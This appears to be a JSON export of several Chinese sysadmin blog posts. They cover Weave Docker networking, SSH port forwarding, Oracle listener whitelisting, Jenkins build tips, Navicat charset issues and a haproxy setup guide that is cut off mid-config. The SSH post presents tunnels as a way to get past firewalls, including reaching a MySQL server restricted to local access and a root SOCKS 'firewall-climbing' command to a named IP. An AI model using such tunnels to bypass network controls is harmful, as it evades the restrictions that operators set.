flags=4099\u0026lt;UP,BROADCAST,MULTICAST\u0026gt; mtu 1500\rinet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255\rether 02:42:24:0d:54:06 txqueuelen 0 (Ethernet)\rRX packets 0 bytes 0 (0.0 B)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 0 bytes 0 (0.0 B)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rdocker_gwbridge: flags=4099\u0026lt;UP,BROADCAST,MULTICAST\u0026gt; mtu 1500\rinet 172.18.0.1 netmask 255.255.0.0 broadcast 172.18.255.255\rinet6 fe80::42:52ff:fe25:3b18 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether 02:42:52:25:3b:18 txqueuelen 0 (Ethernet)\rRX packets 1032 bytes 89148 (87.0 KiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 1032 bytes 89148 (87.0 KiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\reth0: flags=4419\u0026lt;UP,BROADCAST,RUNNING,PROMISC,MULTICAST\u0026gt; mtu 1500\rinet 10.0.0.15 netmask 255.255.255.0 broadcast 10.0.0.255\rinet6 fe80::20c:29ff:fe84:f329 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether 00:0c:29:84:f3:29 txqueuelen 1000 (Ethernet)\rRX packets 97077 bytes 109615069 (104.5 MiB)\rRX errors 0 dropped 244 overruns 0 frame 0\rTX packets 21805 bytes 3174138 (3.0 MiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rlo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536\rinet 127.0.0.1 netmask 255.0.0.0\rinet6 ::1 prefixlen 128 scopeid 0x10\u0026lt;host\u0026gt;\rloop txqueuelen 1 (Local Loopback)\rRX packets 1032 bytes 89148 (87.0 KiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 1032 bytes 89148 (87.0 KiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rvethwe-bridge: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1376\rinet6 fe80::f056:b7ff:fe0f:c146 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether f2:56:b7:0f:c1:46 txqueuelen 0 (Ethernet)\rRX packets 272 bytes 25496 (24.8 KiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 275 bytes 25670 (25.0 KiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rvethwe-datapath: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1376\rinet6 fe80::c495:98ff:fec0:508d prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether c6:95:98:c0:50:8d txqueuelen 0 (Ethernet)\rRX packets 1032 bytes 89148 (87.0 KiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 1032 bytes 89148 (87.0 KiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rvxlan-6784: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 65470\rether 7a:a1:d9:e9:f7:39 txqueuelen 1000 (Ethernet)\rRX packets 513 bytes 372948 (364.2 KiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 520 bytes 379884 (370.9 KiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rweave: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1376\rinet6 fe80::469:deff:fe6b:f186 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether 06:69:de:6b:f1:86 txqueuelen 1000 (Ethernet)\rRX packets 19 bytes 1060 (1.0 KiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 8 bytes 648 (648.0 B)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\r$ docker network ls\rNETWORK ID NAME DRIVER SCOPE\r0ca046b6232c bridge bridge local\r776a38c5868e docker_gwbridge bridge local\r51bfcaafee94 weave weavemesh local\r自动创建docker网络weave\n$ brctl show\rbridge name\tbridge id\tSTP enabled\tinterfaces\rdocker0\t8000.0242240d5406\tno\tdocker_gwbridge\t8000.024252253b18\tno\tvethcb0a2e3\rweave\t8000.0669de6bf186\tno\tvethwe-bridge\rvethwl95e206ea7\r查看weave网络的信息dirver为\u0026quot;Driver\u0026quot;: \u0026quot;weavemesh\u0026quot;\n$ docker network inspect weave\r[\r{\r\u0026quot;Name\u0026quot;: \u0026quot;weave\u0026quot;,\r\u0026quot;Id\u0026quot;: \u0026quot;522dd1c8152750aa5862bdcc3c025bb07b9d66410f267503ae9c4305363d5a82\u0026quot;,\r\u0026quot;Created\u0026quot;: \u0026quot;2018-08-27T17:27:37.265691267+08:00\u0026quot;,\r\u0026quot;Scope\u0026quot;: \u0026quot;local\u0026quot;,\r\u0026quot;Driver\u0026quot;: \u0026quot;weavemesh\u0026quot;,\r\u0026quot;EnableIPv6\u0026quot;: false,\r\u0026quot;IPAM\u0026quot;: {\r\u0026quot;Driver\u0026quot;: \u0026quot;weavemesh\u0026quot;,\r\u0026quot;Options\u0026quot;: null,\r\u0026quot;Config\u0026quot;: [\r{\r\u0026quot;Subnet\u0026quot;: \u0026quot;10.32.0.0/12\u0026quot;\r}\r]\r},\r\u0026quot;Internal\u0026quot;: false,\r\u0026quot;Attachable\u0026quot;: false,\r\u0026quot;Ingress\u0026quot;: false,\r\u0026quot;ConfigFrom\u0026quot;: {\r\u0026quot;Network\u0026quot;: \u0026quot;\u0026quot;\r},\r\u0026quot;ConfigOnly\u0026quot;: false,\r\u0026quot;Containers\u0026quot;: {},\r\u0026quot;Options\u0026quot;: {\r\u0026quot;works.weave.multicast\u0026quot;: \u0026quot;true\u0026quot;\r},\r\u0026quot;Labels\u0026quot;: {}\r}\r]\rWeave网络会在每个宿主机上创建一个网桥，每个容器通过veth pair连接到这个Weave 网桥。容器里面的veth网卡会获取到Weave网络分配给的IP地址和子网掩码。每当容器启动时，会创建两个网络接口。eth0if51 与docker_gwbridge 同属于一个网段。\n1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue qlen 1\rlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\rinet 127.0.0.1/8 scope host lo\rvalid_lft forever preferred_lft forever\r48: ethwe0@if49: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN\u0026gt; mtu 1376 qdisc noqueue link/ether 3e:78:8b:2e:c9:4b brd ff:ff:ff:ff:ff:ff\rinet 10.40.0.0/12 brd 10.47.255.255 scope global ethwe0\rvalid_lft forever preferred_lft forever\r50: eth0@if51: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN\u0026gt; mtu 1500 qdisc noqueue link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff\rinet 172.18.0.2/16 brd 172.18.255.255 scope global eth0\rvalid_lft forever preferred_lft forever\r其中ethwe0@if49，从名称上看出与weave相关，其对应的编号是48。我们从宿主机上面ip link进行查看，ethwe0@if49与vethwle9c9e24ce@if48是一对veth pair，而且被挂在了weave网桥上\n49: vethwle9c9e24ce@if48: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1376 qdisc noqueue master weave state UP link/ether 1a:c5:52:37:66:72 brd ff:ff:ff:ff:ff:ff link-netnsid 1\rinet6 fe80::18c5:52ff:fe37:6672/64 scope link valid_lft forever preferred_lft forever\r51: veth9c86c85@if50: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue master docker_gwbridge state UP link/ether da:57:cc:0c:7d:32 brd ff:ff:ff:ff:ff:ff link-netnsid 1\rinet6 fe80::d857:ccff:fe0c:7d32/64 scope link valid_lft forever preferred_lft forever\rweave\t8000.a2ec14f583ef\tno\tvethwe-bridge\rvethwle9c9e24ce\rweave安装配置 项目地址：https://github.com/weaveworks/weave\n环境准备 环境要求：\nlinux内核版本为3.8以上 dockers版本为1.10.0或更高 主机名 IP地址 软件环境 node01 10.0.0.15 docker-1806 weare node02 10.0.0.16 docker-1806 weare 下载安装weave Weave不需要集中式的key-value存储，所以安装和运行都很简单。直接把Weave二进制文件下载到系统中就可以了。主从节点都需要安装。\nwget -O /usr/local/bin/weave \\\rhttps://github.com/weaveworks/weave/releases/download/v2.4.0/weave \u0026amp;\u0026amp; \\\rchmod +x /usr/local/bin/weave\rReference 1 Docker网络 Weave - Bigberg - 博客园\n2 End of an Era: Weaveworks Closes Shop Amid Cloud Native Turbulence\n","permalink":"https://www.oomkill.com/2018/06/weave-over-host/","summary":"","title":"使用weave实现docker跨宿主机通讯"},{"content":"SSH命令详解 参数 说明 -1 强制使用ssh协议版本1； -2 强制使用ssh协议版本2； -4 强制使用IPv4地址； -6 强制使用IPv6地址； -A 开启认证代理连接转发功能； -a 关闭认证代理连接转发功能； -b 使用本机指定地址作为对应连接的源ip地址； -C 请求压缩所有数据； -F 指定ssh指令的配置文件； -f 后台执行ssh指令； -g 允许远程主机连接主机的转发端口； -i 指定身份文件； -l 指定连接远程服务器登录用户名； -N 不执行远程指令； -o 指定配置选项； -p 指定远程服务器上的端口； -q 静默模式； -X 开启X11转发功能； -x 关闭X11转发功能； -y 开启信任X11转发功能。 -D 指定本地 “动态” 应用程序级端口转发。这通过分配套接字来侦听本地端口，可选地绑定到指定的bind_address。只要与此端口建立连接，就会通过安全通道转发连接，然后使用应用程序协议确定从远程计算机连接的位置。 SSH端口转发实战 概述 在通常情况下，网络防火墙会阻碍你进行某些必要的网络传输。公司的安全策略可能不允许你把SSH密钥存储在某些主机上。或者，你也可能需要在原本安全的环境中运行一些不安全的网络应用程序。\nSSH提供了一个重要功能，称为转发forwarding或者称为隧道传输tunneling，它能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程有时也被叫做tunneling，这是因为 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输而得名。\nSSH端口转发主要用来解决如下两方面问题：\n突破防火墙的限制完成无法建立的 TCP 连接。 加密 Client 端至 Server 端之间的通讯数据。 开启ssh的端口转发功能 ssh端口转发功能默认是打开的。如需修改的话，修改后需要重启sshd服务才会生效。\nAllowTcpForwarding yes\r常用SSH转发类型 在ssh连接的基础上，指定ssh client或ssh server的某个端口作为源地址，所有发至该端口的数据包都会透过ssh连接被转发出去；至于转发的目标地址，目标地址既可以指定，也可以不指定，如果指定了目标地址，称为定向转发，如果不指定目标地址则称为动态转发：\n定向转发\n定向转发把数据包转发到指定的目标地址。目标地址不限定是ssh client 或 ssh server，既可以是二者之一，也可以是二者以外的其他机器。\n动态转发\n动态转发不指定目标地址，数据包转发的目的地是动态决定的。\n本地端口转发 本地转发中的本地是指将本地的某个端口(1024-65535)通过SSH隧道转发至其他主机的套接字，这样当我们的程序连接本地的这个端口时，其实间接连上了其他主机的某个端口，当我们发数据包到这个端口时数据包就自动转发到了那个远程端口上了\n语法\nssh -L [bind_address:]port:host:port ssh_host\rssh -fNC -L 3333:100.109.9.249:22 111.44.246.139\r命令说明\n参数 说明 bind_address 表示客户端主机的ip，这是针对系统有多块网卡，不指定默认是127.0.0.1 port 本地主机指定监听的端口 host 远程主机的ip hostport 指定远程主机的端口，如果远程主机是HTTP，就是80，FTP（21）。 ssh_host 远程主机的ip，也可以是能够访问到远程主机的另一个ip -L表明是本地转发，此时TCP客户端与SSH客户端同在本地主机上。后面接着三个值，由冒号分开，分别表示：需要监听的本地端口，远程主机名或IP地址，及远程的转发目标端口号。\n远程端口转发 远程转发和本地很相似，原理也差不多，但是不同的是，本地转发是在本地主机指定的一个端口，而远程转发是由SSH服务器经由SSH客户端转发，连接至目标服务器上。本质一样，区别在于需要转发的端口是在远程主机上还是在本地主机上\n现在SSH就可以把连接从（39.104.112.253:80）转发到（10.0.0.10:85）。\n语法\nssh -R [bind_ip]:bind_port:host_ip:host_port sshserver\r参数说明\n参数 说明 -R 表示远程转发。 bind_ip 表示绑定的远程主机iP bind_port 远程主机监听端口 host_ip 被访问的主机IP host_port 被访问主机的端口 sshserver 使用sshclient建立隧道的sshserver 动态端口转发 定向转发（包括本地转发和远程转发）的局限性是必须指定某个目标地址，如果需要借助一台中间服务器访问很多目标地址，一个一个地定向转发显然不是好办法，这时就要用的是ssh动态端口转发，它相当于建立一个SOCKS服务器。各种应用经由SSH客户端转发，经过SSH服务器，到达目标服务器，不固定端口。\n语法\nssh -fN -D [ssh client port] ssh server\r参数说明\n参数 说明 -D 动态转发 -f 后台执行 -N 不执行任何命令 ssh client port 监听的端口 ssh server 当作sock5代理服务器(127.0.0.1) SSH端口转发实战 实验1：本地端口转发应用 实验环境 主机 公网IP 内网IP 地位 node01 39.104.116.253 172.24.104.10 client node02 112.35.76.212 172.16.16.18 mysql server 实现在生产内网里有一台mysql服务器（mysql Server），但是限制了只有本机上部署的应用才能直接连接此 mysql服务器。现在我们想临时从本地机器（mysql Client）直接连接到这个mysql服务器，只需要在mysql Client上运用本地端口转发。\n查看node01系统状态 $ ps -ef|grep mysql\rroot 21764 21724 0 23:15 pts/0 00:00:00 grep --color=auto mysql\r$ ss -lnt\rState Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 *:22 *:* 查看node02系统状态\n$ ps -ef|grep mysql\rmysql 2042 1 0 Aug30 ? /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid\rroot 18250 18194 0 23:15 pts/0 grep --color=auto mysql\r在主机A上执行命令：ssh -Nf -L *:7000:127.0.0.1:3306 112.35.76.212\n需要注意的是，在选择端口号时要注意非管理员帐号是无权绑定 1-1023 端口的，所以一般是选用一个 1024-65535 之间的并且尚未使用的端口号即可。\n$ ss -lnt\rState Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 *:22 *:* LISTEN 0 128 *:7000 *:* LISTEN 0 128 :::7000 :::* 可以发现，node01的7000端口已被监听了，是被ssh（ssh就是客服端）监听的，和node02建立了一个SSH隧道，并且我们知道node01和node02是可以通信的，我们可以通过主机A的端口访问时，其实就是间接用主机B在访问。可以看到可以正常登陆mysql。\n注：mysql经过转发实际登陆mysql的用户组成的ip为sshserver登陆的ip。而不是sshclient的ip\n实验2：远程端口转发应用 内网通过路由器（SNAT）可以访问外网，而外网是无法访问到内网的，我们利用ssh来实现访问内网，要搭建这种环境，首先想到的是VMware的NAT模式，我将node03设置NAT模式。\n主机 公网IP 内网IP 地位 node01 112.35.26.104 172.24.104.10 sshserver node02 112.35.76.212 172.16.16.18 sshclient node03 172.16.16.11 mysql node04 客户端 在node02执行命令：ssh -Nf -R *:7706:172.16.16.11:3306 112.35.26.104，sshclient与sshserver建立隧道连接。\n$ netstat -nt|grep 104\rtcp 0 0 172.16.16.18:50676 112.35.26.104:22 ESTABLISHED\rsshserver上可见到监听的端口。\n$ ss -lnt|grep 7706\rLISTEN 0 128 127.0.0.1:7706 *:* LISTEN 0 128 ::1:7706 :::* 登陆环境进行测试\n翻墙命令 ssh -TfnN -D {Port} {User}@{Host}\nssh -TfnN -D 7070 root@195.133.11.43\r","permalink":"https://www.oomkill.com/2018/05/ssh-client-application/","summary":"","title":"SSH客户端应用场景"},{"content":"对Oracle 检查ip合法性,就必须在服务器端的sqlnet.ora文件中设置如下参数\nTCP.INVITED_NODES=(10.0.0.36,10.0.0.1,10.0.0.35) TCP.EXCLUDED_NODES=(10.0.0.2) 启动监听出现如下错误\n$ lsnrctl status LSNRCTL for Linux: Version 11.2.0.1.0 - Production on 12-MAR-2018 18:32:13 Copyright (c) 1991, 2009, Oracle. All rights reserved. Connecting to (ADDRESS=(PROTOCOL=tcp)(HOST=)(PORT=1521)) TNS-12541: TNS:no listener TNS-12560: TNS:protocol adapter error TNS-00511: No listener Linux Error: 111: Connection refused 错误输出并没有打印详细的信息,从lisenter.ora,tnsnames.ora入手,但没有发现文件是错误的。最后检查sqlnet.ora,发现TCP.INVITED_NODES参数有如下约束是官方文档没有给出的\ntcp.invited_nodes需要满足如下条件才可成功启动监听\n1、需要设置参数TCP.VALIDNODE_CHECKING为YES才能激活该特性。 2、tcp.invited_nodes的值中一定要包括本机地址（127.0.0.1 / 10.0.0.36）或localhost，因为监听需要通过本机ip去访问监听，一旦禁止lsnrct将不能启动或停止监听。 3、不能设置ip段和通配符。 4、此方式只适合tcp/ip协议。 5、此方式是通过监听限制白名单的。 6、针对的是ip地址而不是其他（如用户名等）。 7、此配置适用于9i以上版本。本次踩坑是oracle11gr2。 8、修改配置后需要重启监听才可生效。 TCP.INVITED_NODES=(10.0.0.36,10.0.0.1)\n此时在启动监听不会出现报错了。而对与TCP.EXCLUDED_NODES参数并没有以上的限制，需要将禁止访问的ip传参即可。\n","permalink":"https://www.oomkill.com/2018/05/oracle-tcp.validnode_checking/","summary":"","title":"tcp.validnode_checking踩过的坑"},{"content":"jenkins配置如下 在Jenkins上添加了两个节点(Slave Node)，且为这两个节点设置了一个相同的标签 \u0026ldquo;windows\u0026rdquo;。创建了一个新Job – \u0026ldquo;test-windows\u0026rdquo;，选择的是”构建一个自由风格的软件项目”。并且为了使多个slave并行构建，我选择了\u0026quot;只允许绑定到这台机器的job”，在\u0026quot;Label Expression\u0026quot;中选择了\u0026quot;windows\u0026quot;。\n然而这种方式并不能实现多个slave并行操作。网上90%说的都不靠谱。\n在我使用的过程中，使用了label 去管理多个 Slave，给一个项目的构建指定了这个 label，会发现这个项目的多次构建，都使用同一个 Slave，并没有使用 label 里的其它 Slave去构建。\n查了很多资料才发现原来从 jenkins 的调度算法使用了一致性的哈希算法，jenkins根据添加的信息评测出优先级列表，选择优先级最高的Slave去构建，当最优slave不满足条件或者没有可用的 execut时，才会选用下一个slave。\n查了很多资料发现构造多配置项目可以选择构建时的slave。这样可以实现多slave并行构建。\nmulti configuration project比起构建自由风格的软件项目多个Configuration Matrix，在这里可以选择多个slave。这里选择lable的话，还是会使用默认算法从lable中选择最优slave进行构建。\n配置完成后再构建时，会同时在多个slave上进行并行构建\n禁止在master上运行job或和业务相关的操作\n将 [executors] 设置为0\n","permalink":"https://www.oomkill.com/2018/05/jenkins-multi-slave-problem/","summary":"","title":"jenkins多个slave遇到的坑"},{"content":"需求分析 在jenkins中没有找到构建前插件，每次构建时间很长，希望可以实现判断代码是否更新，如果没更细则停止构建步骤。\n实现步骤 在构建时执行shell命令，而jenkins提供的的环境变量可以实现此判断 https://wiki.jenkins.io/display/JENKINS/Conditional+BuildStep+Plugin\nGIT_COMMIT The commit hash being checked out. GIT_PREVIOUS_COMMIT The hash of the commit last built on this branch, if any. GIT_PREVIOUS_SUCCESSFUL_COMMIT The hash of the commit last successfully built on this branch, if any. GIT_COMMIT 当前拉取版本的commit id GIT_PREVIOUS_COMMIT 最后在此分支上构建的 commit id GIT_PREVIOUS_SUCCESSFUL_COMMIT 最后在此分支上成功构建的 commit id号\n#!/bin/bash if [ $GIT_PREVIOUS_SUCCESSFUL_COMMIT == $GIT_COMMIT ];then echo \u0026quot;no change，skip build\u0026quot; exit 0 else echo \u0026quot;git pull commmit id not equals to current commit id trigger build\u0026quot; fi 注意，不能使用-eq 只能使用 “==” 提交新版本后，构建提示如下：\n$ git show|head -1 commit 27617e680d2e6bf00062700623792aef63926edd 在jenkins中执行构建\n","permalink":"https://www.oomkill.com/2018/05/jenkins-checkcode/","summary":"","title":"jenkins检查代码 如没更新停止构建步骤"},{"content":"运行环境 服务器：centos6.8\n服务器oracle版本：oracle 11g R2 64位，字符集是ZHS32utf8。\n客户端：navicat 12x64 windows8.1x64\n问题分析 当在windows客户端使用sqlplus或navicat时如果数据库中文显示“????”\n这种情况是在客户端与服务器端字符集不一致时，从客户端输入了汉字信息。输入的这些信息即便是把客户端字符集更改正确，也无法显示汉字。\n解决方法：退出sqlplus,设置相应的环境变量NLS_LANG\nlinux：\nexport NLS_LANG=\u0026quot;SIMPLIFIED CHINESE_CHINA.ZHS16GBK\u0026quot; windows：\n出现问题 此时。系统cmd命令行使用sqlplus已经正常显示中文，但是navicat中依旧是？？？？\n图为cmd命令行访问sqlplus客户端查询\n图为navicat f6弹出的sqlplus客户端\n原因是因为Navicat Premium默认自带的instant client，但是其是base lite版本的（Basic Lite： Basic 的精简版本，其中仅带有英文错误消息和 Unicode、ASCII 以及西欧字符集支持），不支持中文字符集，而本文中的服务器端oracle恰好是中文字符集。自带版本不支持。此处需要去oracle官网下载相对应的版本。\nhttp://www.oracle.com/technetwork/database/database-technologies/instant-client/downloads/index.html\n将下载的文件解压覆盖navicat中的instantclient目录里的文件。\n此时连接oracle实例提示如下信息\n尽管我们下载了64位的版本。却提示如图信息。这是因为Navicat仅支持32位的，因此还需下载一个32位的客户端。替换到instantclient目录中\n替换完成后连接实例。f6使用sqlplus查询发现中文已经正常显示\n","permalink":"https://www.oomkill.com/2018/04/sqlplus-windows/","summary":"","title":"windows上sqlplus客户端连接oralce数据库中文显示问题"},{"content":"jenkins github tag\n测试项目地址：GitHub - go-redis\\redis: Type-safe Redis client for Golang\n插件下载地址：[git-parameter](http:\\updates.jenkins-ci.org\\download\\plugins\\git-parameter)\npt-online-schema-change\nJenkins中配置gradle项目的坑 - doctorq - CSDN博客\n","permalink":"https://www.oomkill.com/2018/02/jenkins-github-tag/","summary":"","title":"jenkins github tag使用方式"},{"content":"haproxy 介绍 haproxy是一个开源的、高性能的基于TCP和HTTP应用代理的高可用的、负载均衡服务软件，它支持双机热备、高可用、负载均衡、虚拟主机、基于TCP和HTTP的应用代理、图形界面查看信息等功能。其配置简单、维护方便，而且拥有很好的对服务器节点的健康检查功能(相当于keepalived健康检查)，当其代理的后端服务器出现故障时，haproxy会自动的将该故障服务器摘除，当故障的服务器恢复后，haproxy还会自动将该服务器自动加入进来提供服务。\nLVS/NGINX对比 haproxy 特别适用于那些高负载、访问量很大，但又需要会话保持及七层应用代理的业务应用。haproxy运行在今天的普通的服务器硬件上，几乎不需要进行任何的优化就可以支持数以万计的并发连接。并且它的运行模式使得它可以很简单、轻松、安全的整合到各种己有的网站架构中，同时，haproxy的代理模式，可以使得所有应用服务器不会暴露到公共网络上，即后面的节点服务器不需要公网IP地址。\n从1.3版本起，haproxy软件引入了frontend,backend的功能，frontend (ad规则匹配)可以让运维管理人员根据任意HTTP请求头内容做规则匹配，然后把请求定向到相关的backend(这个是事先定义好的多个server pools，等待前端把请求转过来的服务器组)。通过frontend和backend，我们可以很容易的买现haproxy的各种7层应用代理功能。\nhaproxy代理模式 haproxy支持两种主要代理模式：\n1、基于4层的tcp应用代理(例如:可用于邮件服务、内部协议通信服务器、MySQL、HTTPS服务等)。\n2、基于7层的http代理。在4层tcp代理模式下，haproxy仅在客户端和服务器之间进行流量转发。但是在7层http代理模式下，haproxy会分析应用层协议，并且能通过允许、拒绝、交换、增加、修改或者删除请求(request)或者回应(response)里指定内容来控制协议。\n官方网站:www.haproxy.org\nhaproxy 解决方案拓扑图 haproxy L4负载均衡应用架构拓扑 haproxy软件的四层tcp应用代理非常优秀，且配置非常简单、方便，比LVS和Nginx的配置要简单很多，首先，配置haproxy不需要在RS端做任何特殊配置 (只要对应服务开启就OK)就可以实现应用代理，其次，haproxy的配置语法和增加虚拟主机功能等也比lvs/nginx简单。并且和商业版的NS (Netscaler)、F5, A10等负载均衡硬件的使用方法和在架构中的位置一模一样。下面是haproxy的Layer4层应用代理的拓扑结构图:\n说明:由于haproxy软件采用的是类NAT模式(本质不同)的应用代理，数据包来去都会经过haproxy，因此，在流量特别大的情况下(门户级别的流量)，其效率和性能不如LVS的DR模式负载均衡。\n在一般的中小型公司，建议采用haproxy做负载均衡，而不要使用LVS或Nginx。为什么强调中小型公司呢?换句话说，千万PV级别以下直接使用haproxy做负载均衡，会让我们负责维护的运维管理人员配置简单、快速、维护方便，出问题好排查。\nhaproxy L7负载均衡应用架构拓扑 haproxy软件的最大优势在于其7层的根据URL请求头应用过滤的功能以及sesson会话功能，在门户网站的高并发生产架构中，haproxy软件一般用在4层LVS负载均衡软件的下一层，或者像haproxy官方推荐的也可以挂在硬件负载均衡althon, NS, F5, A10下使用，其表现非常好。从2009年起taobao，京东商城的业务也大面积使用了haproxy作为7层CACHE应用代理。\n安装haproxy 模拟真实环境\n搭建合适的模拟环境是一个人学习能力的重要体现。例如：人类第一次上太空也没有真正的环境，但是想去太空就是要自己动手去搭建逼真的模拟环境。实验多了就是经验，自然就有解除生产环境的机会了。\n名称 接口 IP 用途 MASTER eth0 10.0.0.7 外网管理IP用于WAN数据转发 eth1 172.16.1.7 内网管理IP，用于LAN数据转发 eth2 10.0.10.7 用于服务器间心跳连接（直连） VIP 10.0.0.17 用于提供应用程序A挂载服务 BACKUP eth0 10.0.0.8 外网管理IP，用于WAN数据转发 eth1 172.16.1.8 内网管理IP，用于LAN数据转发 eth2 10.0.10.8 用于服务器间心跳连接（直连） VIP 10.0.0.8 用于提供应用程序B挂载服务 下载安装haproxy 下载地址：http://www.haproxy.org/download/\n文档地址：http://www.haproxy.org/download/1.7/doc/configuration.txt\n编译haproxy make TARGET=linux2628 ARCH=x86_64 # \u0026lt;==64位编译配置 make TARGET=linux2628 ARCH=i386 # \u0026lt;==32位编译配置 make PREFIX=/app/haproxy-1.7.5 install ln -s /app/haproxy-1.7.5/ /app/haproxy 配置内核转发功能 net.ipv4_forward=1 # \u0026lt;==基于NAT模式的负载均衡器都需要打开系统转发功能 sysctl -p haproxy启动命令 直接运行命令查看帮助\n$ /app/haproxy/sbin/haproxy HA-Proxy version 1.7.5 2017/04/03 Copyright 2000-2017 Willy Tarreau \u0026lt;willy@haproxy.org\u0026gt; Usage : haproxy [-f \u0026lt;cfgfile|cfgdir\u0026gt;]* [ -vdVD ] [ -n \u0026lt;maxconn\u0026gt; ] [ -N \u0026lt;maxpconn\u0026gt; ] [ -p \u0026lt;pidfile\u0026gt; ] [ -m \u0026lt;max megs\u0026gt; ] [ -C \u0026lt;dir\u0026gt; ] [-- \u0026lt;cfgfile\u0026gt;*] -v displays version ; -vv shows known build options. -d enters debug mode ; -db only disables background mode. -dM[\u0026lt;byte\u0026gt;] poisons memory with \u0026lt;byte\u0026gt; (defaults to 0x50) ... 命令选项\n选项 说明 -D 以后台守护进程启动服务 -f 指定配置文件 -c 检查配置文件语法 -n 设置最大连接数，一般在配置文件中指定 -q 启动时不显示警告 -m 限制使用的内存量 -p 将pid写入文件 -sf 平滑重启 -st 强制重启 注意 -sf 和 -st 重启时需要指定配置文件\nhaproxy服务脚本 在下载解压目录中有默认的启动脚本\n$ ll /root/tools/haproxy-1.7.5/examples/haproxy.init /root/tools/haproxy-1.7.5/examples/haproxy.init 自定义启动脚本\n#!/bin/sh BASE=/app/haproxy COMM=$BASE/sbin/haproxy PIDFILE=$BASE/var/run/haproxy.pid CONF_FILE=$BASE/conf/haproxy.conf1 case \u0026quot;$1\u0026quot; in 'start'|'START') if [ ! -f $PIDFILE ];then $COMM -f $CONF_FILE -D else echo 'haproxy has been started' fi ;; 'status'|'STATUS') if [ ! -f $PIDFILE ];then echo 'haproxy is not running' exit 1 fi for pid in $(cat $PIDFILE);do kill -0 $pid RETVAL=$? if [ $RETVAL == 0 ];then echo 'process '$pid ' not running' fi done echo 'haproxy is running' ;; 'restart'|'RESTART') $COMM -f $CONF_FILE -sf $(cat $PIDFILE) ;; 'stop'|'STOP') kill $(cat $PIDFILE) rm -f $PIDFILE ;; 'check'|'CHECK') $COMM -f $CONF_FILE -c ;; *) echo \u0026quot;USAGE $0 start|stop|restart|status|check|\u0026quot; exit 1 ;; esac haproxy配置文件 haproxy 的默认配置文件在下载解压目录下\n/root/tools/haproxy-1.7.5/examples aproxy的配置文件可以分为5部分\nglobal：全局配置参数段，主要用来控制haproxy启动前的进程及系统相关设置。\ndefault：配置一些默认参数，如果frontend，backend，listen等段未设置则使用default段配置。\nlisten：\nfrontend：用来匹配接受客户所请求的域名，uri等，并针对不同配置，做不同的请求处理。\nbackend：定义后端服务器集群，以及对后端 服务器的一切权重、队列、连接数等选项的设置。\n配置文件示例注释说明\nglobal #\u0026lt;==全局配置, 用于设定义全局参数, 属于进程级的配置, 通常与操作系统配置有关 chroot /app/haproxy/var/chroot #\u0026lt;==运行路径 daemon #\u0026lt;==以守护方式运行haproxy user haproxy #\u0026lt;==运行haproxy用户/组, 或者使用关键字uid/gid group haproxy log\t127.0.0.1 local0 debug # 全局日志配置指定127.0.0.1:514的syslog服务中local0日志设备。 # 与记录日志的模式[err warning info debug] pidfile /app/haproxy/var/run/haproxy.pid maxconn\t2000 #设置每haproxy进程的最大并发连接数, 其等同于命令行选项“-n”; # “ulimit -n”自动计算的结果参照此参数设定. nbproc 1 #\u0026lt;==启动的haproxy进程数量, 只能用于守护进程模式。应该设置为cup核数 # ulimit-n 655350 # 设置每进程所能够打开的最大文件描述符数目。 # 默认情况其会自动进行计算, 因此不推荐修改此选项. defaults #\u0026lt;==默认配置 mode http #\u0026lt;==默认的模式【tcp:4层； http:7层； health:只返回OK】 log global #\u0026lt;==继承全局的日志定义输出 #option httplog #\u0026lt;==日志类别, httplog # 如果后端服务器需要记录客户端真实ip, 需要在HTTP请求中添加”X-Forwarded-For”字段; # 但haproxy自身的健康检测机制访问后端服务器时, 不应将记录访问日志。 # 可用except来排除127.0.0.0，即haproxy本身. #option forwardfor except 127.0.0.0/8 option forwardfor option httpclose # 开启http协议中服务器端关闭功能每个请求完毕后主动关闭http通道。 # 使得支持长连接，使得会话可以被重用，使得每一个日志记录都会被记录. option dontlognull #\u0026lt;==如果产生了一个空连接，那这个空连接的日志将不会记录. option 